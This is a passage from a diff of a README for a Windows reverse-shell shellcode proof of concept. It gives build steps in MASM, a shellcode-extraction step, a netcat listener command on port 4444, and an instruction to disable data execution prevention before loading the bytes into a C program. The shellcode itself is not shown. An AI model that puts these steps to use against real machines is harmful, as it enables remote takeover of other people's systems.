@@ -17,26 +17,31 @@ These instructions will get you a copy of the POC files on your local system for
 ```
 git clone https://username@bitbucket.org/teamsinspace/documentation-tests.git
 ```
-2. Open **makefile.txt** and change **masmPath** based on its location in your local machine:
+2. Open **makefile.txt** and change **masmPath** based on the location of masm32 in your local machine:
 ```
 masmPath= //your masm32 path
 ```
-3. Open **Developer Command Prompt for VS** and execute following commands to build the **shellcode.asm** file to **shellcode.exe** file:
+3. Open **shellcode.asm** and change **windows.inc** path based on the location of masm32 in your local machine:
+```
+include masm32path\include\windows.inc
+```
+
+4. Open **Developer Command Prompt for VS** and execute following commands to build the **shellcode.asm** file to **shellcode.exe** file:
 ```
 cd ProjectFolder path
 nmake makefile.txt
 ```
-4. To extract the shellcode bytes from **shellcode.exe** into output file called **shellcodebytes.txt** execute the following:
+5. To extract the shellcode bytes from **shellcode.exe** into output file called **shellcodebytes.txt** execute the following:
 ```
 python3 shellcode_extractor.py shellcode.asm 
 ```
 
-5. open **CMD** and make **netcat** listen on port what you have specified in shellcode.asm (the default is 4444):
+6. open **CMD** and make **netcat** listen on port what you have specified in shellcode.asm (the default is 4444):
 ```
 nc -lvp 4444
 ```
 
-6. create c or c++ project and disable **data execution prevention (DEP)** then write the following code:
+7. create c or c++ project and disable **data execution prevention (DEP)** then write the following code:
 
 ```
 char shellcode[] = "";	// copy shellcode from shellcodebytes.txt
